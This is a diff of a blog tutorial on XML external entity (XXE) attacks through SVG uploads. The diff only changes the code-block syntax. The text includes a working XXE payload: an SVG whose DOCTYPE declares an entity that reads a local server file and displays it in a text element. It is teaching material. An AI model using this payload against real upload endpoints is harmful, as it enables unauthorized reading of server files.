@@ -11,13 +11,13 @@ XXE stands for XML external entity and basically it's a common web vulnerability
 This means that a site that allows us to upload an `.svg` file is basically allowing us to upload an XML, and thus it may be vulnerable to XXE!
 
 An svg file look's like this:
-{% highlight xml %}
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <svg height="100" width="100">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
   <text x="50" y="50" text-anchor="middle">Text Here!</text>
 </svg> 
-{% endhighlight %}
+```
 And when opened with a browser we see this:
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
@@ -28,14 +28,14 @@ And when opened with a browser we see this:
 
 # *Exploiting an svg upload*
 So let's see what an exploited svg file looks like. Let's take the file above as an example. Basically we want to inject a entity that reads a file. We will end with something like this:
-{% highlight xml %}
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE example [ <!ENTITY xxe SYSTEM "file:///filepath/goes/here" > ]>
 <svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
   <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
   <text x="50" y="50" text-anchor="middle">&xxe;</text>
 </svg> 
-{% endhighlight %}
+```
 As we see, the trick is simple. We just need to be sure that the `entity` is referred inside a `<text>` tag, otherwise we won't be able to read anything. 
 
 # *What this looks like in practice*
